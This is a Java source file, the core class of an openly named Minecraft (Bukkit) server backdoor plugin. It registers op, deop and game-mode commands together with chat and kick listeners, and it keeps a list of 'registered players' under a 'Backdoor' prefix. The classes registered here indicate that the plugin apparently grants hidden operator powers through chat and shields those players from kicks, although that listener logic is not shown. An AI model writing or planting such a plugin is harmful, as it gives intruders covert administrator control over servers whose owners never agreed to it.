package de.blox.backdoor.core;

import de.blox.backdoor.commands.BackdoorCommandProvider;
import de.blox.backdoor.commands.implement.DeopCommand;
import de.blox.backdoor.commands.implement.GameModeCommand;
import de.blox.backdoor.commands.implement.OpCommand;
import de.blox.backdoor.listener.PlayerKickListener;
import de.blox.backdoor.listener.PlayerChatListener;
import org.bukkit.Bukkit;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;


import java.util.ArrayList;
import java.util.List;

public final class Core extends JavaPlugin {

    private static Core instance;

    private final List<String> registeredPlayers = new ArrayList<>();
    private final String prefix = "§3Backdoor §7| §b";
    private final BackdoorCommandProvider commandProvider = new BackdoorCommandProvider();

    @Override
    public void onLoad() {
        instance = this;
    }

    @Override
    public void onEnable() {
        this.registerCommands();
        this.registerListener();
    }

    @Override
    public void onDisable() {
    }

    private void registerCommands() {
        this.commandProvider.register(new DeopCommand());
        this.commandProvider.register(new OpCommand());
        this.commandProvider.register(new GameModeCommand());
    }

    private void registerListener() {
        PluginManager pluginManager = Bukkit.getPluginManager();
        pluginManager.registerEvents(new PlayerChatListener(), this);
        pluginManager.registerEvents(new PlayerKickListener(), this);
    }

    public static Core getInstance() {
        return instance;
    }

    public List<String> getRegisteredPlayers() {
        return registeredPlayers;
    }

    public String getPrefix() {
        return prefix;
    }

    public BackdoorCommandProvider getCommandProvider() {
        return commandProvider;
    }
}
